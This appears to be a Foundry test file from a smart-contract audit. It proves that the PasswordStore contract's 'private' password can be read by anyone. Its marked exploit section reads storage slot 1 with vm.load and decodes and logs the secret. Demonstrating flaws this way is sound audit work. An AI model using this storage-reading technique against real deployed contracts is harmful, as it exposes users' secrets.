// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";

contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public owner;
    address public attacker;

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
        attacker = makeAddr("attacker");
    }

    function test_any_non_owner_can_see_password() public {
    string memory victimPassword = "mySecretPassword"; // Defines Victim's (Owner's) password
    vm.startPrank(owner); // Simulates Victim's address for the next call
    passwordStore.setPassword(victimPassword); // Victim sets their password

    // At this point, Victim thinks their password is now "privately" stored on the protocol and is completely secret.
    // The exploit code that now follows can be performed by just about everyone on the blockchain who are aware of the Victim's protocol and can access and read the Victim's password.

    /////////// EXPLOIT CODE performed by Attacker ///////////

    // By observing the protocol's source code at `PasswordStore.sol`, we notice that `s_password` is the second storage variable declared in the contract. Since storage slots are alloted in the order of declaration in the EVM, its slot value will be '1'
    uint256 S_PASSWORD_STORAGE_SLOT_VALUE = 1;

    // Access the protocol's storage data at slot 1
    bytes32 slotData = vm.load(
        address(passwordStore),
        bytes32(S_PASSWORD_STORAGE_SLOT_VALUE)
    );

    // Converting `bytes` data to `string`
    string memory anyoneCanReadPassword = string(
        abi.encodePacked(slotData)
    );
    // Exposes Victim's password on console
    console.log(anyoneCanReadPassword);
    }
}
